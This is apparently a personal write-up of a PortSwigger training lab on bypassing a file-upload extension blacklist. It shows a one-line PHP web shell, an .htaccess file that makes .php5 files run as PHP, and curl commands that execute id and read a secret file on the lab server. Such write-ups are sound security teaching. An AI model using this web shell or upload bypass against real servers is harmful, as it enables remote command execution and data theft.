# Web shell upload via extension blacklist bypass

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass), you'll learn: Web shell upload via extension blacklist bypass! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★☆☆☆☆☆☆

## Background

This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed due to a fundamental flaw in the configuration of this blacklist.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-4/images/Pasted%20image%2020221216011314.png)

**Login as user `wiener`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-4/images/Pasted%20image%2020221216011331.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-4/images/Pasted%20image%2020221216011338.png)

In the previous labs, we found the image upload function is vulnerable.

**Let's try to upload a PHP web shell, and intercept the request via Burp Suite:**
```php
<?php system($_GET['cmd']); ?>
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-4/images/Pasted%20image%2020221216011833.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-4/images/Pasted%20image%2020221216011853.png)

When we clicked the `Upload` button, it'll send a POST request to `/my-account/avatar`.

**Let's forward that request:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-4/images/Pasted%20image%2020221216011950.png)

Hmm... `php files are not allowed`.

**To bypass this, we can rename the file extension to `.php5`. This extension tells the web server to use PHP version 5.**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-4/images/Pasted%20image%2020221216012133.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-4/images/Pasted%20image%2020221216012148.png)

We've successfully uploaded the web shell!

**Can we execute any commands?**
```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-2]
└─# curl https://0a7e00e604ca24d3c074863600320039.web-security-academy.net/files/avatars/webshell.php5 --get --data-urlencode "cmd=id"                     
<?php system($_GET['cmd']); ?>
```

Nope.

This might happen is because **servers typically won't execute files unless they have been configured to do so.**

**In FireFox extension `Wappalyzer`, it will tell us which web server is using:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-4/images/Pasted%20image%2020221216012534.png)

In this case, **the web server is using `Apache`.**

**In Apache server, before executing PHP files requested by a client, developers might have to add the following directives to their `/etc/apache2/apache2.conf` file:**
```
LoadModule php_module /usr/lib/apache2/modules/libphp.so
AddType application/x-httpd-php .php
```

Many servers also allow developers to create special configuration files within individual directories in order to override or add to one or more of the global settings.

In Apache servers, it will load a directory-specific configuration from a file called `.htaccess` if one is present.

**Now, what if I upload a file called `.htaccess` to override the server configuration?**

**After poking around, I found this [Medium blog](https://asreshashank.medium.com/execute-php-scripts-into-html-file-by-modifying-htaccess-file-8517ed1e2066):**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-4/images/Pasted%20image%2020221216013635.png)

**With that said, we can create our own `.htaccess` with the following configuration:**
```
AddType application/x-httpd-php .php5
```

**By doing that, we can execute any file that has `.php5` extension!**

**Let's do that!**
```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-4]
└─# echo "AddType application/x-httpd-php .php5" > .htaccess
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-4/images/Pasted%20image%2020221216013901.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-4/images/Pasted%20image%2020221216013921.png)

**Change the `Content-Type` to `text/plain`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-4/images/Pasted%20image%2020221216013954.png)

**Then forward the request:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-4/images/Pasted%20image%2020221216014018.png)

**Now, we should able to execute our uploaded web shell!**
```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-2]
└─# curl https://0a7e00e604ca24d3c074863600320039.web-security-academy.net/files/avatars/webshell.php5 --get --data-urlencode "cmd=id"
uid=12002(carlos) gid=12002(carlos) groups=12002(carlos)
```

**Yes! Let's `cat` the `secret` file:**
```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-2]
└─# curl https://0a7e00e604ca24d3c074863600320039.web-security-academy.net/files/avatars/webshell.php5 --get --data-urlencode "cmd=cat /home/carlos/secret"
msmjtxD8JyjrKVclp0tr4TlZDhWle315
```

# What we've learned:

1. Web shell upload via extension blacklist bypass